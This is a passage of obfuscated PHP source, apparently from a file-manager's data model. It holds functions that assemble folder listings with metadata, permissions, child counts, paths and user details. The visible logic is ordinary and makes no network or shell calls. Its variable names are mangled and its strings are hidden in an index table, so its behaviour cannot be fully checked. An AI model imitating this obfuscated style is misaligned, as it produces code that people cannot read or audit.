$„ğ´´ì¦[191]); $’Ä’Š’ = array_unique($’Ä’Š’); $this->_listSourceCache($æùõ²€ş); if (!$¿ˆŸ½…Œ) { $this->_listAppendMeta($æùõ²€ş, $’Ä’Š’); $this->_listAppendFileMeta($æùõ²€ş, $’Ä’Š’); $this->_listAppendChildren($æùõ²€ş, $’Ä’Š’); } $this->_listAppendPath($æùõ²€ş); $this->_listAppendAuth($æùõ²€ş); $this->_listAppendSourceInfo($æùõ²€ş, $’Ä’Š’); $this->_listAppendUser($æùõ²€ş); $this->_listFilterInfo($æùõ²€ş, $¿ˆŸ½…Œ); $this->_listAppendAuthSecret($æùõ²€ş); } protected function _listSourceCache($­¾Ä•İù) { $À„íşŞ½ =& $_SERVER[‚ûòÉ˜ş]; foreach ($­¾Ä•İù as $œó“¤) { self::$cacheSourceInfo[$À„íşŞ½[509] . $œó“¤[$À„íşŞ½[191]]] = $œó“¤; } } protected function _listFilterInfo(&$¸ÆÔ¥“î, $Ã‹ÜîÊÌ = false) { $”œ¢ ÊŒ =& $_SERVER[‚ûòÉ˜ş]; foreach ($¸ÆÔ¥“î as &$Ö–äÖ) { $Ö–äÖ = $this->pathInfoFilter($Ö–äÖ); self::$cachePathInfo[$”œ¢ ÊŒ[510] . intval($Ã‹ÜîÊÌ) . $”œ¢ ÊŒ[438] . $Ö–äÖ[$”œ¢ ÊŒ[191]]] = $Ö–äÖ; } unset($Ö–äÖ); } protected function _listMake(&$Í³Í€ğÂ) { $ù¹ü„ÚÈ =& $_SERVER[‚ûòÉ˜ş]; $Í³Í€ğÂ[$ù¹ü„ÚÈ[92]] = array(); $Í³Í€ğÂ[$ù¹ü„ÚÈ[93]] = array(); foreach ($Í³Í€ğÂ[$ù¹ü„ÚÈ[422]] as $†¤ŸÉ) { $ê¥Ëƒ¼í = $†¤ŸÉ[$ù¹ü„ÚÈ[461]] == 1 ? $ù¹ü„ÚÈ[92] : $ù¹ü„ÚÈ[93]; $Í³Í€ğÂ[$ê¥Ëƒ¼í][] = $†¤ŸÉ; } unset($Í³Í€ğÂ[$ù¹ü„ÚÈ[422]]); } protected function _listAppendMeta(&$¹¹ì‹û, $öª¶²ß) { $İõØ·Úñ =& $_SERVER[‚ûòÉ˜ş]; $‡œ©Áœó = array($İõØ·Úñ[467] => array($İõØ·Úñ[468], $öª¶²ß)); $»»˜ï®“ = Model($İõØ·Úñ[511])->field($İõØ·Úñ[512])->where($‡œ©Áœó)->select(); if (!$»»˜ï®“) { return; } $ØÉ¡“¡ = array($İõØ·Úñ[513], $İõØ·Úñ[514], $İõØ·Úñ[493]); $¶í…¿æ¼ = array(); foreach ($»»˜ï®“ as $¸¢„¢öß) { if (!isset($¶í…¿æ¼[$¸¢„¢öß[$İõØ·Úñ[191]]])) { $¶í…¿æ¼[$¸¢„¢öß[$İõØ·Úñ[191]]] = array(); } if (in_array($¸¢„¢öß[$İõØ·Úñ[104]], $ØÉ¡“¡)) { continue; } $¶í…¿æ¼[$¸¢„¢öß[$İõØ·Úñ[191]]][$¸¢„¢öß[$İõØ·Úñ[104]]] = $¸¢„¢öß[$İõØ·Úñ[427]]; } foreach ($¹¹ì‹û as &$œ…îÔ‚Í) { $œ…îÔ‚Í[$İõØ·Úñ[515]] = !1; if (isset($¶í…¿æ¼[$œ…îÔ‚Í[$İõØ·Úñ[191]]])) { $œ…îÔ‚Í[$İõØ·Úñ[515]] = $¶í…¿æ¼[$œ…îÔ‚Í[$İõØ·Úñ[191]]]; } if ($this->fileIsLock($œ…îÔ‚Í) && $œ…îÔ‚Í[$İõØ·Úñ[463]]) { $»É¡ûÀ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $œ…îÔ‚Í[$İõØ·Úñ[463]][$İõØ·Úñ[464]] = AuthModel::authDisable($œ…îÔ‚Í[$İõØ·Úñ[463]][$İõØ·Úñ[464]], $»É¡ûÀ); $œ…îÔ‚Í[$İõØ·Úñ[463]][$İõØ·Úñ[516]][$İõØ·Úñ[463]] = $œ…îÔ‚Í[$İõØ·Úñ[463]][$İõØ·Úñ[464]]; } } unset($œ…îÔ‚Í); } protected function _listAppendFileMeta(&$à¢ùŒ±Æ, $—ƒŠëä) { $¸¬è‚ò =& $_SERVER[‚ûòÉ˜ş]; $ÜÑÒ“¸‚ = array_to_keyvalue($à¢ùŒ±Æ, $¸¬è‚ò[12], $¸¬è‚ò[517]); $ÜÑÒ“¸‚ = array_filter(array_unique($ÜÑÒ“¸‚)); if (!$ÜÑÒ“¸‚) { return; } $—‘Ù°»Š = array($¸¬è‚ò[518] => array($¸¬è‚ò[468], $ÜÑÒ“¸‚)); $¡–İù™Š = $¸¬è‚ò[519]; $ŞĞšÃ” = Model($¸¬è‚ò[520])->field($¡–İù™Š)->where($—‘Ù°»Š)->select(); $ŞĞšÃ” = array_to_keyvalue($ŞĞšÃ”, $¸¬è‚ò[517]); $ºñîş’æ = Model($¸¬è‚ò[521])->field($¸¬è‚ò[522])->where($—‘Ù°»Š)->select(); $ºñîş’æ = $ºñîş’æ ? $ºñîş’æ : array(); $‹³®¦”å = array(); foreach ($ºñîş’æ as $Å”¼çŠ) { if (!isset($‹³®¦”å[$Å”¼çŠ[$¸¬è‚ò[517]]])) { $‹³®¦”å[$Å”¼çŠ[$¸¬è‚ò[517]]] = array(); } $‹³®¦”å[$Å”¼çŠ[$¸¬è‚ò[517]]][$Å”¼çŠ[$¸¬è‚ò[104]]] = $Å”¼çŠ[$¸¬è‚ò[427]]; } foreach ($à¢ùŒ±Æ as &$Ç‚·ƒ”°) { $ù†³ˆå = $Ç‚·ƒ”°[$¸¬è‚ò[517]]; if (!$ù†³ˆå || !is_array($ŞĞšÃ”[$ù†³ˆå])) { continue; } $Ã‘¼ö” = $ŞĞšÃ”[$ù†³ˆå]; $Ã‘¼ö”[$¸¬è‚ò[86]] = $Ç‚·ƒ”°[$¸¬è‚ò[86]]; $Ã‘¼ö”[$¸¬è‚ò[42]] = $Ç‚·ƒ”°[$¸¬è‚ò[42]]; if (!isset(self::$cacheFileInfo[$¸¬è‚ò[523] . $ù†³ˆå])) { self::$cacheFileInfo[$¸¬è‚ò[523] . $ù†³ˆå] = array_merge(array(), $Ã‘¼ö”); } unset($ŞĞšÃ”[$ù†³ˆå][$¸¬è‚ò[94]]); $ŸÆğ¾™è = is_array($‹³®¦”å[$ù†³ˆå]) ? $‹³®¦”å[$ù†³ˆå] : array(); $Ç‚·ƒ”°[$¸¬è‚ò[524]] = array_merge($ŸÆğ¾™è, $ŞĞšÃ”[$ù†³ˆå]); if (isset($Ç‚·ƒ”°[$¸¬è‚ò[524]][$¸¬è‚ò[181]])) { $Ç‚·ƒ”°[$¸¬è‚ò[181]] = json_decode($Ç‚·ƒ”°[$¸¬è‚ò[524]][$¸¬è‚ò[181]], !0); unset($Ç‚·ƒ”°[$¸¬è‚ò[524]][$¸¬è‚ò[181]]); } } unset($Ç‚·ƒ”°); } protected function _listAppendSourceInfo(&$’Û’ï™×, $•ıæó‚ñ) { $½ğÍ”©û =& $_SERVER[‚ûòÉ˜ş]; $£É„£º¸ = Model($½ğÍ”©û[525])->listData(); $§í¾Å¸é = Model($½ğÍ”©û[475])->listData(); $ôâ¦ç®¼ = Model($½ğÍ”©û[465])->listData(); $ÌÊ°²ˆ = Model($½ğÍ”©û[526])->listSimple(); $ú‚ùØï‰ = array_to_keyvalue($£É„£º¸, $½ğÍ”©û[451]); $ºÊ’Óšê = array_to_keyvalue_group($§í¾Å¸é, $½ğÍ”©û[94], $½ğÍ”©û[476]); $©ı«Ã‘š = array_to_keyvalue($ôâ¦ç®¼, $½ğÍ”©û[94]); $²ØÎ€Õ = array_to_keyvalue_group($ÌÊ°²ˆ, $½ğÍ”©û[191]); foreach ($’Û’ï™× as &$Ş©ŸÃ¯) { $Ş©ŸÃ¯[$½ğÍ”©û[97]] = array($½ğÍ”©û[527] => 0, $½ğÍ”©û[528] => 0, $½ğÍ”©û[529] => 0); if (isset($©ı«Ã‘š[$Ş©ŸÃ¯[$½ğÍ”©û[191]]])) { $Ş©ŸÃ¯[$½ğÍ”©û[97]][$½ğÍ”©û[530]] = 1; $Ş©ŸÃ¯[$½ğÍ”©û[97]][$½ğÍ”©û[531]] = $©ı«Ã‘š[$Ş©ŸÃ¯[$½ğÍ”©û[191]]][$½ğÍ”©û[42]]; } if ($ºÊ’Óšê && $ú‚ùØï‰ && isset($ºÊ’Óšê[$Ş©ŸÃ¯[$½ğÍ”©û[191]]])) { $Ş©ŸÃ¯[$½ğÍ”©û[97]][$½ğÍ”©û[532]] = array(); foreach ($ºÊ’Óšê[$Ş©ŸÃ¯[$½ğÍ”©û[191]]] as $ÃÌËÍÓ) { $ä§ÙßÕ = $ú‚ùØï‰[$ÃÌËÍÓ]; $Ş©ŸÃ¯[$½ğÍ”©û[97]][$½ğÍ”©û[532]][] = array($½ğÍ”©û[533] => $ä§ÙßÕ[$½ğÍ”©û[451]], $½ğÍ”©û[470] => $ä§ÙßÕ[$½ğÍ”©û[42]], $½ğÍ”©û[534] => $ä§ÙßÕ[$½ğÍ”©û[535]]); } } if ($²ØÎ€Õ && isset($²ØÎ€Õ[$Ş©ŸÃ¯[$½ğÍ”©û[191]]])) { $Ş©ŸÃ¯[$½ğÍ”©û[97]][$½ğÍ”©û[536]] = array(); foreach ($²ØÎ€Õ[$Ş©ŸÃ¯[$½ğÍ”©û[191]]] as $Òš€«·ñ) { $÷ÀÔÍ« = $½ğÍ”©û[537]; if ($Òš€«·ñ[$½ğÍ”©û[538]] == $½ğÍ”©û[98]) { $÷ÀÔÍ« .= $½ğÍ”©û[539]; } $Ş©ŸÃ¯[$½ğÍ”©û[97]][$½ğÍ”©û[536]] = array_field_key($Òš€«·ñ, explode($½ğÍ”©û[60], $÷ÀÔÍ«)); } } } unset($Ş©ŸÃ¯); return $’Û’ï™×; } protected function _listAppendChildren(&$Ä¦Øå»–, $¿íÕÖà¹) { $¯Âç„÷‡ =& $_SERVER[‚ûòÉ˜ş]; $°Ï¥…Ôˆ = array(); $„¬Ğ…ë‹ = array($¯Âç„÷‡[233] => 0, $¯Âç„÷‡[234] => 0); foreach ($Ä¦Øå»– as &$»è‘¼ğ) { if (!$»è‘¼ğ[$¯Âç„÷‡[461]]) { continue; } $°Ï¥…Ôˆ[] = $»è‘¼ğ[$¯Âç„÷‡[191]]; } unset($»è‘¼ğ); if (!$°Ï¥…Ôˆ) { return; } $ÆÒ“­‡é = array($¯Âç„÷‡[190] => array($¯Âç„÷‡[7], $°Ï¥…Ôˆ), $¯Âç„÷‡[481] => 0); $©ì×Øìè = array($¯Âç„÷‡[190], $¯Âç„÷‡[461], $¯Âç„÷‡[540] => $¯Âç„÷‡[541]); $˜¬íòä© = $this->field($©ì×Øìè)->where($ÆÒ“­‡é)->group($¯Âç„÷‡[542])->select(); $éÎ¦Ñ³é = array(); foreach ($˜¬íòä© as $»ˆ† Àò) { $õÖòô±ğ = $»ˆ† Àò[$¯Âç„÷‡[190]]; $×Ç²¤€ü = $»ˆ† Àò[$¯Âç„÷‡[461]] == $¯Âç„÷‡[98] ? $¯Âç„÷‡[234] : $¯Âç„÷‡[233]; if (!isset($éÎ¦Ñ³é[$õÖòô±ğ])) { $éÎ¦Ñ³é[$õÖòô±ğ] = array($¯Âç„÷‡[233] => 0, $¯Âç„÷‡[234] => 0); } $éÎ¦Ñ³é[$õÖòô±ğ][$×Ç²¤€ü] += $»ˆ† Àò[$¯Âç„÷‡[541]]; } foreach ($Ä¦Øå»– as &$»è‘¼ğ) { if (!$»è‘¼ğ[$¯Âç„÷‡[461]]) { continue; } $¼¨¿£Êó = is_array($éÎ¦Ñ³é[$»è‘¼ğ[$¯Âç„÷‡[191]]]) ? $éÎ¦Ñ³é[$»è‘¼ğ[$¯Âç„÷‡[191]]] : $„¬Ğ…ë‹; $»è‘¼ğ[$¯Âç„÷‡[234]] = $¼¨¿£Êó[$¯Âç„÷‡[234]]; $»è‘¼ğ[$¯Âç„÷‡[233]] = $¼¨¿£Êó[$¯Âç„÷‡[233]]; unset($»è‘¼ğ[$¯Âç„÷‡[462]]); } unset($»è‘¼ğ); } protected function _listAppendAuth(&$í“ºõÒ) { $­ïÓ¤Ñä =& $_SERVER[‚ûòÉ˜ş]; $ËñÆÎšã = array(); foreach ($í“ºõÒ as $Ş—Ö©ğø) { if ($Ş—Ö©ğø[$­ïÓ¤Ñä[188]] == self::TYPE_GROUP) { $ËñÆÎšã[] = $Ş—Ö©ğø[$­ïÓ¤Ñä[191]]; } } if (!$ËñÆÎšã) { return; } $™ó±âÑÙ = array_to_keyvalue($í“ºõÒ, $­ïÓ¤Ñä[191]); $ÀŠ£™¦ = Model($­ïÓ¤Ñä[543])->getSourceList($ËñÆÎšã, $™ó±âÑÙ); $õéÀè±è = $GLOBALS[$­ïÓ¤Ñä[544]] == 1; foreach ($í“ºõÒ as $¿˜Ş¼ç® => &$Ş—Ö©ğø) { $Ş—Ö©ğø[$­ïÓ¤Ñä[463]] = $ÀŠ£™¦[$Ş—Ö©ğø[$­ïÓ¤Ñä[191]]]; if (!$Ş—Ö©ğø[$­ïÓ¤Ñä[463]] && $Ş—Ö©ğø[$­ïÓ¤Ñä[188]] == self::TYPE_GROUP) { $Ş—Ö©ğø[$­ïÓ¤Ñä[463]] = Action($­ïÓ¤Ñä[545])->pathGroupAuthMake($Ş—Ö©ğø[$­ïÓ¤Ñä[546]]); if (!$Ş—Ö©ğø[$­ïÓ¤Ñä[463]] && !$õéÀè±è) { $Ş—Ö©ğø[$­ïÓ¤Ñä[227]] = !1; $Ş—Ö©ğø[$­ïÓ¤Ñä[226]] = !1; } } if ($Ş—Ö©ğø[$­ïÓ¤Ñä[463]]) { $Ş—Ö©ğø[$­ïÓ¤Ñä[227]] = AuthModel::authCheckEdit($Ş—Ö©ğø[$­ïÓ¤Ñä[463]][$­ïÓ¤Ñä[464]]); $Ş—Ö©ğø[$­ïÓ¤Ñä[226]] = AuthModel::authCheckView($Ş—Ö©ğø[$­ïÓ¤Ñä[463]][$­ïÓ¤Ñä[464]]); } $this->groupPathDisplay($Ş—Ö©ğø); } unset($Ş—Ö©ğø); } public function _listAppendAuthSecret(&$„’úèùÌ) { $±Ÿ´Ï½­ =& $_SERVER[‚ûòÉ˜ş]; if (Model($±Ÿ´Ï½­[484])->get($±Ÿ´Ï½­[547]) != $±Ÿ´Ï½­[98]) { return; } static $¤Û¾†² = false; if (!$¤Û¾†²) { $ï™ ¥’Ú = Model($±Ÿ´Ï½­[548]); $©êĞ—ğ = Model($±Ÿ´Ï½­[549]); $¤Û¾†² = $©êĞ—ğ->listData(); $¤Û¾†² = array_to_keyvalue($¤Û¾†², $±Ÿ´Ï½­[191]); $¡ËşÊíÎ = json_decode(Model($±Ÿ´Ï½­[484])->get($±Ÿ´Ï½­[550]), !0); $¡ËşÊíÎ = array_to_keyvalue($¡ËşÊíÎ, $±Ÿ´Ï½­[451]); foreach ($¤Û¾†² as $öå™€ç => $’îù«Â®) { $äï÷œø– = $¡ËşÊíÎ[$’îù«Â®[$±Ÿ´Ï½­[551]]]; if (!$äï÷œø–) { $©êĞ—ğ->remove($’îù«Â®[$±Ÿ´Ï½­[451]]); unset($¤Û¾†²[$öå™€ç]); continue; } $“¸ÂÉ©¶ = $ï™ ¥’Ú->listData($äï÷œø–[$±Ÿ´Ï½­[463]]); if (!$“¸ÂÉ©¶) { $©êĞ—ğ->remove($’îù«Â®[$±Ÿ´Ï½­[451]]); unset($¤Û¾†²[$öå™€ç]); continue; } $’îù«Â®[$±Ÿ´Ï½­[463]] = $“¸ÂÉ©¶; $’îù«Â®[$±Ÿ´Ï½­[552]] = $äï÷œø–; $’îù«Â®[$±Ÿ´Ï½­[553]] = Model($±Ÿ´Ï½­[554])->getInfoSimpleOuter($’îù«Â®[$±Ÿ´Ï½­[503]]); $¤Û¾†²[$öå™€ç] = $’îù«Â®; } } $ß¡’¡ú¾ = USER_ID; $ïÅÇÆÆş = array(); $øËˆÙï¡ = $this->_listAppendPath($ïÅÇÆÆş, !0); foreach ($„’úèùÌ as $öå™€ç => &$’îù«Â®) { if (!is_array($’îù«Â®[$±Ÿ´Ï½­[463]])) { continue; } if ($’îù«Â®[$±Ÿ´Ï½­[188]] != $±Ÿ´Ï½­[555]) { continue; } if (isset($¤Û¾†²[$’îù«Â®[$±Ÿ´Ï½­[191]]])) { $êş˜­ßÈ = $¤Û¾†²[$’îù«Â®[$±Ÿ´Ï½­[191]]]; if (!is_array($’îù«Â®[$±Ÿ´Ï½­[515]])) { $’îù«Â®[$±Ÿ´Ï½­[515]] = array(); } $’îù«Â®[$±Ÿ´Ï½­[515]][$±Ÿ´Ï½­[556]] = $êş˜­ßÈ[$±Ÿ´Ï½­[551]]; $’îù«Â®[$±Ÿ´Ï½­[463]][$±Ÿ´Ï½­[557]] = $êş˜­ßÈ; $’îù«Â®[$±Ÿ´Ï½­[463]][$±Ÿ´Ï½­[558]] = $’îù«Â®[$±Ÿ´Ï½­[559]]; $’îù«Â®[$±Ÿ´Ï½­[463]][$±Ÿ´Ï½­[560]] = $±Ÿ´Ï½­[98]; if ($êş˜­ßÈ[$±Ÿ´Ï½­[503]] != $ß¡’¡ú¾) { $’îù«Â®[$±Ÿ´Ï½­[463]][$±Ÿ´Ï½­[464]] = $’îù«Â®[$±Ÿ´Ï½­[463]][$±Ÿ´Ï½­[464]] & $êş˜­ßÈ[$±Ÿ´Ï½­[463]][$±Ÿ´Ï½­[463]]; } continue; } $Œ“–×ƒ‡ = $this->parentLevelArray($’îù«Â®[$±Ÿ´Ï½­[561]]); $Ö´‘Çá = array_reverse($Œ“–×ƒ‡); foreach ($Ö´‘Çá as $ºîƒ•Ñ‘ => $ÈëÉê—ö) { if (!isset($¤Û¾†²[$ÈëÉê—ö])) { continue; } $êş˜­ßÈ = $¤Û¾†²[$ÈëÉê—ö]; $’îù«Â®[$±Ÿ´Ï½­[463]][$±Ÿ´Ï½­[557]] = $êş˜­ßÈ; if ($êş˜­ßÈ[$±Ÿ´Ï½­[503]] != $ß¡’¡ú¾) { $’îù«Â®[$±Ÿ´Ï½­[463]][$±Ÿ´Ï½­[464]] = $’îù«Â®[$±Ÿ´Ï½­[463]][$±Ÿ´Ï½­[464]] & $êş˜­ßÈ[$±Ÿ´Ï½­[463]][$±Ÿ´Ï½­[463]]; } $’£ÆÔø× = $±Ÿ´Ï½­[12]; $˜¤ƒû¡ˆ = count($Œ“–×ƒ‡) - $ºîƒ•Ñ‘; for ($º€Š² = 0; $º€Š² < $˜¤ƒû¡ˆ; $º€Š²++) { if (!isset($øËˆÙï¡[$Œ“–×ƒ‡[$º€Š²]])) { $’£ÆÔø× = $±Ÿ´Ï½­[12]; break; } $’£ÆÔø× = $’£ÆÔø× . rtrim($øËˆÙï¡[$Œ“–×ƒ‡[$º€Š²]], $±Ÿ´Ï½­[8]) . $±Ÿ´Ï½­[8]; } $’îù«Â®[$±Ÿ´Ï½­[463]][$±Ÿ´Ï½­[558]] = rtrim($’£ÆÔø×, $±Ÿ´Ï½­[8]) . $±Ÿ´Ï½­[8]; break; } } unset($’îù«Â®); } public function groupPathDisplay(&$¸å¦üü×) { $ª×„‹©Ê =& $_SERVER[‚ûòÉ˜ş]; if ($¸å¦üü×[$ª×„‹©Ê[188]] != self::TYPE_GROUP) { return; } $¬ÛÎ‚÷È = Model($ª×„‹©Ê[562])->getInfo($¸å¦üü×[$ª×„‹©Ê[546]]); $«çŞÒ­ = $this->parentLevelArray($¬ÛÎ‚÷È[$ª×„‹©Ê[561]]); $å®„Ü¯ = $ª×„‹©Ê[12]; foreach ($«çŞÒ­ as $ŠĞÑéÆü) { $Ô½¾Ûû÷ = Model($ª×„‹©Ê[562])->getInfo($ŠĞÑéÆü); $å®„Ü¯ .= $Ô½¾Ûû÷[$ª×„‹©Ê[97]][$ª×„‹©Ê[191]] . $ª×„‹©Ê[60]; } $¸å¦üü×[$ª×„‹©Ê[563]] = $¬ÛÎ‚÷È[$ª×„‹©Ê[190]]; $¸å¦üü×[$ª×„‹©Ê[564]] = $¬ÛÎ‚÷È[$ª×„‹©Ê[561]]; $¸å¦üü×[$ª×„‹©Ê[565]] = $¬ÛÎ‚÷È[$ª×„‹©Ê[566]]; $¸å¦üü×[$ª×„‹©Ê[567]] = $å®„Ü¯ . $¬ÛÎ‚÷È[$ª×„‹©Ê[97]][$ª×„‹©Ê[191]]; } protected function _listAppendPath(&$Î«½¨½, $£íê—ª = false) { $ÃÙäÓ =& $_SERVER[‚ûòÉ˜ş]; static $˜í×³çó = array(); $€¸”–§Ÿ = array(); $Ù‹ßËº = array(); if ($£íê—ª) { return $˜í×³çó; } foreach ($Î«½¨½ as &$»Ü¾••Ó) { $äçá›ËÓ = $»Ü¾••Ó[$ÃÙäÓ[191]]; if ($»Ü¾••Ó[$ÃÙäÓ[461]] == $ÃÙäÓ[98] && $»Ü¾••Ó[$ÃÙäÓ[190]] != 0) { $˜í×³çó[$äçá›ËÓ] = $»Ü¾••Ó[$ÃÙäÓ[42]]; } if ($»Ü¾••Ó[$ÃÙäÓ[461]] == $ÃÙäÓ[98] && $»Ü¾••Ó[$ÃÙäÓ[190]] == 0) { $˜í×³çó[$äçá›ËÓ] = $this->_listAppendPathRoot($»Ü¾••Ó, array()); } if (isset($Ù‹ßËº[$»Ü¾••Ó[$ÃÙäÓ[561]]])) { continue; } $Ù‹ßËº[$»Ü¾••Ó[$ÃÙäÓ[561]]] = !0; $–¶«µ = $this->parentLevelArray($»Ü¾••Ó[$ÃÙäÓ[561]]); foreach ($–¶«µ as $–§¼Äæ§ => $ğ…ÍØ« ) { if (isset($˜í×³çó[$ğ…ÍØ« ])) { continue; } if ($–§¼Äæ§ == 0) { $˜í×³çó[$ğ…ÍØ« ] = $this->_listAppendPathRoot($»Ü¾••Ó, $–¶«µ); } if ($–§¼Äæ§ != 0) { $€¸”–§Ÿ[] = $ğ…ÍØ« ; } } } unset($»Ü¾••Ó); $€¸”–§Ÿ = array_unique($€¸”–§Ÿ); if (count($€¸”–§Ÿ) > 0) { $ˆ÷”–˜¨ = array($ÃÙäÓ[467] => array($ÃÙäÓ[468], $€¸”–§Ÿ)); if (count($€¸”–§Ÿ) == 1) { $ÌöàÎ = $this->sourceInfo($€¸”–§Ÿ[0]); $°İÁ²ß® = is_array($ÌöàÎ) ? array($ÌöàÎ) : !1; } else { $°İÁ²ß® = $this->field($ÃÙäÓ[568])->where($ˆ÷”–˜¨)->select(); } if (!$°İÁ²ß®) { $°İÁ²ß® = array(); } foreach ($°İÁ²ß® as $û“ßÎ¼) { $˜í×³çó[$û“ßÎ¼[$ÃÙäÓ[191]]] = $û“ßÎ¼[$ÃÙäÓ[42]]; } } $¾‡Ë·İß = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ä…ÌÁ = array(); foreach ($Î«½¨½ as &$»Ü¾••Ó) { $§†ÛÆ‰• = $»Ü¾••Ó[$ÃÙäÓ[561]]; $ØÈÛŞŠÈ = $ÃÙäÓ[12]; if (isset($ä…ÌÁ[$§†ÛÆ‰•])) { $ØÈÛŞŠÈ = $ä…ÌÁ[$§†ÛÆ‰•]; } else { $–¶«µ = $this->parentLevelArray($»Ü¾••Ó[$ÃÙäÓ[561]]); foreach ($–¶«µ as $–§¼Äæ§ => $ğ…ÍØ« ) { if (isset($˜í×³çó[$ğ…ÍØ« ])) { $ØÈÛŞŠÈ .= $˜í×³çó[$ğ…ÍØ« ] . $ÃÙäÓ[8]; } } $ä…ÌÁ[$§†ÛÆ‰•] = $ØÈÛŞŠÈ; } $ØÈÛŞŠÈ .= $»Ü¾••Ó[$ÃÙäÓ[42]]; if ($»Ü¾••Ó[$ÃÙäÓ[461]] == $ÃÙäÓ[98]) { $ØÈÛŞŠÈ .= $ÃÙäÓ[8]; } $»Ü¾••Ó[$ÃÙäÓ[559]] = str_replace($ÃÙäÓ[569], $ÃÙäÓ[8], $ØÈÛŞŠÈ); if ($»Ü¾••Ó[$ÃÙäÓ[190]] == $ÃÙäÓ[222]) { $»Ü¾••Ó[$ÃÙäÓ[42]] = trim($˜í×³çó[$»Ü¾••Ó[$ÃÙäÓ[191]]], $ÃÙäÓ[8]); $»Ü¾••Ó[$ÃÙäÓ[559]] = $»Ü¾••Ó[$ÃÙäÓ[42]] . $ÃÙäÓ[8]; } if (intval($»Ü¾••Ó[$ÃÙäÓ[188]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($»Ü¾••Ó, $–¶«µ, $¾‡Ë·İß); } } unset($»Ü¾••Ó); return $Î«½¨½; } private function _listAppendPathRecycle(&$ÀˆÔ±æˆ, $Öû×È¼Á, $Î­ºÈ»¦) { $ëÇÍï­ =& $_SERVER[‚ûòÉ˜ş]; if (!in_array($Î­ºÈ»¦, $Öû×È¼Á) && $ÀˆÔ±æˆ[$ëÇÍï­[191]] != $Î­ºÈ»¦) { return; } $Ä‚Óáüß = explode($ëÇÍï­[8], trim($ÀˆÔ±æˆ[$ëÇÍï­[559]], $ëÇÍï­[8])); $ÂÌ»èßÈ = implode($ëÇÍï­[8], array_slice($Ä‚Óáüß, 2)); $ÀˆÔ±æˆ[$ëÇÍï­[559]] = $ëÇÍï­[8] . LNG($ëÇÍï­[570]) . $ëÇÍï­[8] . ltrim($ÂÌ»èßÈ, $ëÇÍï­[8]); $ÀˆÔ±æˆ[$ëÇÍï­[561]] = $ëÇÍï­[571] . implode($ëÇÍï­[60], array_slice($Öû×È¼Á, 1)) . $ëÇÍï­[60]; if ($ÀˆÔ±æˆ[$ëÇÍï­[191]] == $Î­ºÈ»¦) { $ÀˆÔ±æˆ[$ëÇÍï­[561]] = $ëÇÍï­[571]; $ÀˆÔ±æˆ[$ëÇÍï­[190]] = $ëÇÍï­[222]; $ÀˆÔ±æˆ[$ëÇÍï­[42]] = LNG($ëÇÍï­[570]); } $ÀˆÔ±æˆ[$ëÇÍï­[572]] = $ëÇÍï­[573]; } protected function _listAppendPathRoot(&$¦õ§Ô˜, $‹Ìº…·é) { $®Ù×«Æ¯ =& $_SERVER[‚ûòÉ˜ş]; static $²×àœØé = false; $¼î™‹àê = $®Ù×«Æ¯[12]; if ($¦õ§Ô˜[$®Ù×«Æ¯[188]] == self::TYPE_USER) { if ($¦õ§Ô˜[$®Ù×«Æ¯[546]] == USER_ID) { $¼î™‹àê = LNG($®Ù×«Æ¯[574]); if ($²×àœØé === !1) { $ÊôéÖå¾ = Model($®Ù×«Æ¯[575])->getInfoFull(USER_ID); $²×àœØé = _get($ÊôéÖå¾, $®Ù×«Æ¯[576], $®Ù×«Æ¯[12]); } if ($‹Ìº…·é && $‹Ìº…·é[0] == $²×àœØé || !$‹Ìº…·é && $¦õ§Ô˜[$®Ù×«Æ¯[191]] == $²×àœØé) { $¼î™‹àê = LNG($®Ù×«Æ¯[577]); $¦õ§Ô˜[$®Ù×«Æ¯[578]] = $®Ù×«Æ¯[579]; } if (!$‹Ìº…·é) { $¦õ§Ô˜[$®Ù×«Æ¯[42]] = $¼î™‹àê; } } else { $¦õ§Ô˜[$®Ù×«Æ¯[580]] = Model($®Ù×«Æ¯[554])->getInfoSimpleOuter($¦õ§Ô˜[$®Ù×«Æ¯[546]]); $¼î™‹àê = LNG($®Ù×«Æ¯[581]) . $®Ù×«Æ¯[173] . $¦õ§Ô˜[$®Ù×«Æ¯[580]][$®Ù×«Æ¯[42]] . $®Ù×«Æ¯[175]; } } else { if ($¦õ§Ô˜[$®Ù×«Æ¯[188]] == self::TYPE_GROUP) { $Æ”¨Ø = Model($®Ù×«Æ¯[562])->getInfoSimple($¦õ§Ô˜[$®Ù×«Æ¯[546]]); $¼î™‹àê = $Æ”¨Ø[$®Ù×«Æ¯[42]]; } else { if ($¦õ§Ô˜[$®Ù×«Æ¯[188]] == self::TYPE_SYSTEM) { $¼î™‹àê = $®Ù×«Æ¯[582]; } } } $¼î™‹àê = $¼î™‹àê ? $®Ù×«Æ¯[8] . $¼î™‹àê . $®Ù×«Æ¯[8] : $®Ù×«Æ¯[8]; return $¼î™‹àê; } protected function _listAppendUser(&$¤Ú££õ¦) { $ÓÓ÷óÏğ =& $_SERVER[‚ûòÉ˜ş]; $¥¡Ø—¤î = array_to_keyvalue($¤Ú££õ¦, $ÓÓ÷óÏğ[12], $ÓÓ÷óÏğ[503]); $‹Ï¬æ¡ = array_to_keyvalue($¤Ú££õ¦, $ÓÓ÷óÏğ[12], $ÓÓ÷óÏğ[505]); $ÉÆßÓ„Š = array_merge($¥¡Ø—¤î, $‹Ï¬æ¡); $ü‘êÕ = Model($ÓÓ÷óÏğ[575])->userListInfo($ÉÆßÓ„Š); foreach ($¤Ú££õ¦ as &$¨Ë¯î) { $»Å®í¡¤ = $¨Ë¯î[$ÓÓ÷óÏğ[503]]; $¨Ë¯î[$ÓÓ÷óÏğ[503]] = $ü‘êÕ[$»Å®í¡¤] ? $ü‘êÕ[$»Å®í¡¤] : !1; $»Å®í¡¤ = $¨Ë¯î[$ÓÓ÷óÏğ[505]]; $¨Ë¯î[$ÓÓ÷óÏğ[505]] = $ü‘êÕ[$»Å®í¡¤] ? $ü‘êÕ[$»Å®í¡¤] : !1; if (isset($¨Ë¯î[$ÓÓ÷óÏğ[515]]) && $¨Ë¯î[$ÓÓ÷óÏğ[515]][$ÓÓ÷óÏğ[583]]) { $âñòÎ·“ = $GLOBALS[$ÓÓ÷óÏğ[6]][$ÓÓ÷óÏğ[99]][$ÓÓ÷óÏğ[584]]; if ($¨Ë¯î[$ÓÓ÷óÏğ[515]][$ÓÓ÷óÏğ[585]] <= time() - $âñòÎ·“) { $this->metaSet($¨Ë¯î[$ÓÓ÷óÏğ[191]], $ÓÓ÷óÏğ[583], null); 